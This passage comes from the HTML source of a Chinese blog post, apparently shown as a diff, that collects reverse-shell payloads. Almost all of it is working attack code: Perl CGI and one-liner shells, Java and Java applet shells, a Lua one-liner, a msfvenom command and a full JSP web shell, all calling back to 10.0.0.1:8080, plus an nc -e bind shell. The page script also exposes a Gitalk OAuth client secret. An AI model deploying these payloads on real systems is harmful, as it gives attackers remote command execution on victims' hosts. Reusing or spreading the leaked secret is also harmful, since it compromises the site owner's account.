class="keyword">chdir</span>(<span class="string">'/'</span>);</div><div class="line">    <span class="keyword">umask</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"><span class="comment"># Make TCP connection for reverse shell</span></div><div class="line"><span class="keyword">socket</span>(SOCK, PF_INET, SOCK_STREAM, <span class="keyword">getprotobyname</span>(<span class="string">'tcp'</span>));</div><div class="line"><span class="keyword">if</span> (<span class="keyword">connect</span>(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123;</div><div class="line">    cgiprint(<span class="string">"Sent reverse shell to $ip:$port"</span>);</div><div class="line">    cgiprintpage();</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    cgiprint(<span class="string">"Couldn't open reverse shell to $ip:$port: $!"</span>);</div><div class="line">    cgiexit();</div><div class="line">&#125;</div><div class="line"><span class="comment"># Redirect STDIN, STDOUT and STDERR to the TCP connection</span></div><div class="line"><span class="keyword">open</span>(STDIN, <span class="string">"&gt;&amp;SOCK"</span>);</div><div class="line"><span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;SOCK"</span>);</div><div class="line"><span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;SOCK"</span>);</div><div class="line">$ENV&#123;<span class="string">'HISTFILE'</span>&#125; = <span class="string">'/dev/null'</span>;</div><div class="line"><span class="keyword">system</span>(<span class="string">"w;uname -a;id;pwd"</span>);</div><div class="line"><span class="keyword">exec</span>(&#123;<span class="string">"/bin/sh"</span>&#125; ($fake_process_name, <span class="string">"-i"</span>));</div><div class="line"><span class="comment"># Wrapper around print</span></div><div class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprint</span> </span>&#123;</div><div class="line">    <span class="keyword">my</span> $line = <span class="keyword">shift</span>;</div><div class="line">    $line .= <span class="string">"&amp;lt;p&amp;gt;\n"</span>;</div><div class="line">    $global_page .= $line;</div><div class="line">&#125;</div><div class="line"><span class="comment"># Wrapper around exit</span></div><div class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiexit</span> </span>&#123;</div><div class="line">    cgiprintpage();</div><div class="line">    <span class="keyword">exit</span> <span class="number">0</span>; <span class="comment"># 0 to ensure we don't give a 500 response.</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment"># Form HTTP response using all the messages gathered by cgiprint so far</span></div><div class="line"><span class="function"><span class="keyword">sub</span> <span class="title">cgiprintpage</span> </span>&#123;</div><div class="line">    <span class="keyword">print</span> <span class="string">"Content-Length: "</span> . <span class="keyword">length</span>($global_page) . <span class="string">"\r</span></div><div class="line">Connection: close\r</div><div class="line">Content-Type: text\/html\r\n\r\n" . $global_page;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e <span class="string">'use strict;use Socket;use FileHandle;use POSIX;my $VERSION = "1.0";my $ip = "10.0.0.1";my $port = 8080;my $daemon = 1;my $auth = 0; my $authorised_client_pattern = qr(/^127\.0\.0\.1$/);my $global_page = "";my $fake_process_name = "/usr/sbin/apache";$0 = "[httpd]";if (defined($ENV&#123;"REMOTE_ADDR"&#125;)) &#123;cgiprint("Browser IP address appears to be: $ENV&#123;'</span>REMOTE_ADDR<span class="string">'&#125;");if ($auth) &#123;unless ($ENV&#123;"REMOTE_ADDR"&#125; =~ $authorised_client_pattern) &#123;cgiprint("ERROR: Your client is not authorised to view this page");cgiexit();&#125;&#125;&#125; elsif ($auth) &#123;cgiprint("ERROR: Authentication is enabled, but I could not determine your IP address. Denying access");cgiexit(0);&#125;if ($daemon) &#123;my $pid = fork();if ($pid) &#123;cgiexit(0);&#125;setsid();chdir("/");umask(0);&#125;socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname("tcp"));if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) &#123;cgiprint("Sent reverse shell to $ip:$port");cgiprintpage();&#125; else &#123;cgiprint("Could not open reverse shell to $ip:$port: $!");cgiexit();&#125;open(STDIN, "&gt;&amp;SOCK");open(STDOUT,"&gt;&amp;SOCK");open(STDERR,"&gt;&amp;SOCK");$ENV&#123;"HISTFILE"&#125; = "/dev/null";system("w;uname -a;id;pwd");exec(&#123;"/bin/sh"&#125; ($fake_process_name, "-i"));sub cgiprint &#123;my $line = shift;$line .= "&lt;p&gt;\n";$global_page .= $line;&#125;sub cgiexit &#123;cgiprintpage();exit 0;&#125;sub cgiprintpage &#123;print "Content-Length: " . length($global_page) . "\r\nConnection: close\r\nContent-Type: text\/html\r\n\r\n" . $global_page;&#125;'</span></div></pre></td></tr></table></figure>
+<h3 id="7、Java"><a href="#7、Java" class="headerlink" title="7、Java"></a>7、Java</h3><p>ReverseShell.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReverseShell</span></span></div><div class="line">&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</div><div class="line">        <span class="keyword">try</span>&#123;</div><div class="line">            Runtime r = Runtime.getRuntime();</div><div class="line">            Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;);</div><div class="line">            p.waitFor();</div><div class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>值得一提的是，由于java并不是脚本式语言，所以并不支持直接运行一行程序！所以需要进行的操作是：</p>
+<blockquote>
+<p>先将上述内容复制到一个文件中，以ReverseShell.java命名(必须是这个名字，类和文件名要一致)；</p>
+<p>然后运行javac ReverseShell.java生成ReverseShell.class字节码文件。（这个操作需要javac，该命令依赖jdk）</p>
+<p>最后执行java ReverseShell（执行过程中不用加后缀，java命令依赖于jre，最好将其放置在后台运行。即加上&amp;或者nohup）</p>
+</blockquote>
+<p>下面提供一个相对较为完整的Applet程序，其应该在网页中运行的，但是为了测试简单，我们直接在其中加入了main函数，所以有点像一个单独的程序一样。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div></pre></td><td class="code"><pre><div class="line">import java.io.*;</div><div class="line">import java.net.Socket;</div><div class="line">import java.util.*;</div><div class="line">import java.util.regex.*;</div><div class="line">import java.applet.Applet;</div><div class="line"></div><div class="line">public class poc extends Applet&#123;</div><div class="line">    /**</div><div class="line">     * Author: daniel baier alias duddits</div><div class="line">     * Licens: GPL</div><div class="line">     * Requirements: JRE 1.5 for running and the JDK 1.5 for compiling or higher</div><div class="line">     * Version: 0.1 alpha release</div><div class="line">     */</div><div class="line"></div><div class="line">    public String cd(String start, File currentDir) &#123;</div><div class="line">        File fullPath = new File(currentDir.getAbsolutePath());</div><div class="line">        String sparent = fullPath.getAbsoluteFile().toString();</div><div class="line">        return sparent + &quot;/&quot; + start;</div><div class="line"></div><div class="line">        &#125;</div><div class="line"></div><div class="line">    @SuppressWarnings(&quot;unchecked&quot;)</div><div class="line">    public void init() &#123;</div><div class="line">        poc rs = new poc();</div><div class="line">        PrintWriter out;</div><div class="line">        try &#123;</div><div class="line">            Socket clientSocket = new Socket(&quot;10.0.0.1&quot;,8080);</div><div class="line">            out = new PrintWriter(clientSocket.getOutputStream(), true);</div><div class="line">            out.println(&quot;\tJRS 0.1 alpha release\n\tdeveloped by duddits alias daniel baier&quot;);</div><div class="line">            boolean run = true;</div><div class="line">            String s;</div><div class="line">            BufferedReader br = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));</div><div class="line">            String startort = &quot;/&quot;;</div><div class="line">            while (run) &#123;</div><div class="line">                String z1;</div><div class="line">                File f = new File(startort);</div><div class="line">                out.println(f.getAbsolutePath() + &quot;&gt; &quot;);</div><div class="line">                s = br.readLine();</div><div class="line">                z1 = s;</div><div class="line">                Pattern pcd = Pattern.compile(&quot;^cd\\s&quot;);</div><div class="line">                Matcher mcd = pcd.matcher(z1);</div><div class="line">                String[] teile1 = pcd.split(z1);</div><div class="line">                if (s.equals(&quot;exit&quot;)) &#123;</div><div class="line">                    run = false;</div><div class="line">                &#125;else if (s.equals(null) || s.equals(&quot;cmd&quot;) || s.equals(&quot;&quot;)) &#123;</div><div class="line"></div><div class="line">                &#125; else if(mcd.find())&#123;</div><div class="line">                    try &#123;</div><div class="line">                        String cds = rs.cd(teile1[1], new File(startort));</div><div class="line">                        startort = cds;</div><div class="line">                        &#125; catch (Exception verz) &#123;</div><div class="line">                        out.println(&quot;Path &quot; + teile1[1]</div><div class="line">                        + &quot; not found.&quot;);</div><div class="line">                        &#125;</div><div class="line"></div><div class="line">                &#125;else &#123;</div><div class="line"></div><div class="line">                    String z2;</div><div class="line"></div><div class="line"></div><div class="line">                    z2 = s;</div><div class="line">                    Pattern pstring = Pattern.compile(&quot;\\s&quot;);</div><div class="line">                    String[] plist = pstring.split(z2);</div><div class="line"></div><div class="line">                    try &#123;</div><div class="line"></div><div class="line">                        LinkedList slist = new LinkedList();</div><div class="line">                        for (int i = 0; i &lt; plist.length; i++) &#123;</div><div class="line">                            slist.add(plist[i]);</div><div class="line">                        &#125;</div><div class="line"></div><div class="line">                        ProcessBuilder builder = new ProcessBuilder(slist);</div><div class="line">                        builder.directory(new File(startort));</div><div class="line">                        Process p = builder.start();</div><div class="line">                        Scanner se = new Scanner(p.getInputStream());</div><div class="line">                        if (!se.hasNext()) &#123;</div><div class="line">                            Scanner sa = new Scanner(p.getErrorStream());</div><div class="line">                            while (sa.hasNext()) &#123;</div><div class="line">                                out.println(sa.nextLine());</div><div class="line">                            &#125;</div><div class="line">                        &#125;</div><div class="line">                        while (se.hasNext()) &#123;</div><div class="line">                            out.println(se.nextLine());</div><div class="line">                        &#125;</div><div class="line"></div><div class="line"></div><div class="line">                    &#125; catch (Exception err) &#123;</div><div class="line">                        out.println(f.getAbsolutePath() + &quot;&gt; Command &quot;</div><div class="line">                                + s + &quot; failed!&quot;);</div><div class="line">                        out.println(f.getAbsolutePath() +&quot;&gt; Please try cmd /c &quot;+ s+&quot; or bash -c &quot; +s+&quot; if this command is an shell buildin.&quot;);</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            if(!clientSocket.isConnected())&#123;</div><div class="line">                run = false;</div><div class="line">                out.flush();</div><div class="line">                out.close();</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125; catch (Exception io) &#123;</div><div class="line">            //System.err.println(&quot;Connection refused by peer&quot;);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    public static void main(String[] args)&#123;</div><div class="line">        poc p = new poc();</div><div class="line">        p.init();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<blockquote>
+<p>运行此程序之前，应该更改环境变量的设置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; export DISPLAY=:0.0</div><div class="line">&gt; 或者</div><div class="line">&gt; setenv DISPLAY :0.0</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="8、Lua"><a href="#8、Lua" class="headerlink" title="8、Lua"></a>8、Lua</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','8080');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></div></pre></td></tr></table></figure>
+<p>不建议安装最新的lua，因为会出现以下问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">lua: (command line):1: module &apos;socket&apos; not found:</div><div class="line">	no field package.preload[&apos;socket&apos;]</div><div class="line">	no file &apos;/usr/local/share/lua/5.2/socket.lua&apos;</div></pre></td></tr></table></figure>
+<p>这个时候，你应该查看一下服务器上的/usr/local/share/lua下的目录到底是5.1还是5.2，根据其版本，安装正确的lua</p>
+<h3 id="9、Jsp"><a href="#9、Jsp" class="headerlink" title="9、Jsp"></a>9、Jsp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">使用</div><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=8080 R &gt; re.jsp</div></pre></td></tr></table></figure>
+<p>reverse_shell.jsp</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.lang.*"</span>%&gt;</div><div class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.util.*"</span>%&gt;</div><div class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.io.*"</span>%&gt;</div><div class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.net.*"</span>%&gt;</div><div class="line"></div><div class="line">&lt;%</div><div class="line">  <span class="class"><span class="keyword">class</span> <span class="title">StreamConnector</span> <span class="keyword">extends</span> <span class="title">Thread</span></span></div><div class="line">  &#123;</div><div class="line">    InputStream zd;</div><div class="line">    OutputStream fm;</div><div class="line"></div><div class="line">    StreamConnector( InputStream zd, OutputStream fm )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">this</span>.zd = zd;</div><div class="line">      <span class="keyword">this</span>.fm = fm;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">      BufferedReader fr  = <span class="keyword">null</span>;</div><div class="line">      BufferedWriter ctw = <span class="keyword">null</span>;</div><div class="line">      <span class="keyword">try</span></div><div class="line">      &#123;</div><div class="line">        fr  = <span class="keyword">new</span> BufferedReader( <span class="keyword">new</span> InputStreamReader( <span class="keyword">this</span>.zd ) );</div><div class="line">        ctw = <span class="keyword">new</span> BufferedWriter( <span class="keyword">new</span> OutputStreamWriter( <span class="keyword">this</span>.fm ) );</div><div class="line">        <span class="keyword">char</span> buffer[] = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">8192</span>];</div><div class="line">        <span class="keyword">int</span> length;</div><div class="line">        <span class="keyword">while</span>( ( length = fr.read( buffer, <span class="number">0</span>, buffer.length ) ) &gt; <span class="number">0</span> )</div><div class="line">        &#123;</div><div class="line">          ctw.write( buffer, <span class="number">0</span>, length );</div><div class="line">          ctw.flush();</div><div class="line">        &#125;</div><div class="line">      &#125; <span class="keyword">catch</span>( Exception e )&#123;&#125;</div><div class="line">      <span class="keyword">try</span></div><div class="line">      &#123;</div><div class="line">        <span class="keyword">if</span>( fr != <span class="keyword">null</span> )</div><div class="line">          fr.close();</div><div class="line">        <span class="keyword">if</span>( ctw != <span class="keyword">null</span> )</div><div class="line">          ctw.close();</div><div class="line">      &#125; <span class="keyword">catch</span>( Exception e )&#123;&#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">try</span></div><div class="line">  &#123;</div><div class="line">    String ShellPath;</div><div class="line"><span class="keyword">if</span> (System.getProperty(<span class="string">"os.name"</span>).toLowerCase().indexOf(<span class="string">"windows"</span>) == -<span class="number">1</span>) &#123;</div><div class="line">  ShellPath = <span class="keyword">new</span> String(<span class="string">"/bin/sh"</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">  ShellPath = <span class="keyword">new</span> String(<span class="string">"cmd.exe"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">    Socket socket = <span class="keyword">new</span> Socket( <span class="string">"10.0.0.1"</span>, <span class="number">8080</span> );</div><div class="line">    Process process = Runtime.getRuntime().exec( ShellPath );</div><div class="line">    ( <span class="keyword">new</span> StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();</div><div class="line">    ( <span class="keyword">new</span> StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();</div><div class="line">  &#125; <span class="keyword">catch</span>( Exception e ) &#123;&#125;</div><div class="line">%&gt;</div></pre></td></tr></table></figure>
+<h3 id="10、正向shell（nc为例）"><a href="#10、正向shell（nc为例）" class="headerlink" title="10、正向shell（nc为例）"></a>10、正向shell（nc为例）</h3><p>服务器端（有的nc版本不支持-e，这个时候你可以参考<a href="#2、NetCat">NetCat</a>）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvvp 7777 -e /bin/bash</div></pre></td></tr></table></figure>
+<p>攻击端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc 10.0.0.2 7777</div></pre></td></tr></table></figure>
+<p>最后要说的是xterm，这是一个session，可以维持；而由于服务器上和本地都得装相应的程序，所以起来较为麻烦！</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/shell/" rel="tag"># shell</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+          <div class="wp_rating">
+            <div id="wpac-rating"></div>
+          </div>
+        
+
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/12/09/tools/tmux使用教程/" rel="next" title="tmux使用教程">
+                <i class="fa fa-chevron-left"></i> tmux使用教程
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/02/08/android/android逆向准备工作/" rel="prev" title="android逆向准备工作">
+                android逆向准备工作 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="gitalk-container"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/me.jpg"
+               alt="Introspelliam" />
+          <p class="site-author-name" itemprop="name">Introspelliam</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+           
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+            
+              <a href="/archives/">
+            
+                <span class="site-state-item-count">125</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">17</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">56</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/Introspelliam" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                    
+                      GitHub
+                    
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/u/3008590672" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                    
+                      Weibo
+                    
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、Bash"><span class="nav-text">1、Bash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、NetCat"><span class="nav-text">2、NetCat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、PHP"><span class="nav-text">3、PHP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4、Python"><span class="nav-text">4、Python</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5、Ruby"><span class="nav-text">5、Ruby</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6、Perl"><span class="nav-text">6、Perl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7、Java"><span class="nav-text">7、Java</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8、Lua"><span class="nav-text">8、Lua</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9、Jsp"><span class="nav-text">9、Jsp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10、正向shell（nc为例）"><span class="nav-text">10、正向shell（nc为例）</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Introspelliam</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+  <span class="post-meta-divider">|</span>
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.2</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+  <script src="/js/md5.min.js"></script>
+   <script type="text/javascript">
+        var gitalk = new Gitalk({
+          clientID: '41857e5205be9fe36c48',
+          clientSecret: 'c927ea37a432eff67cdb1081658112c7409ca7ff',
+          repo: 'Introspelliam.github.io',
+          owner: 'Introspelliam',
+          admin: ['Introspelliam'],
+          id: md5(location.pathname),
+          distractionFreeMode: 'true'
+        })
+        gitalk.render('gitalk-container')           
+       </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
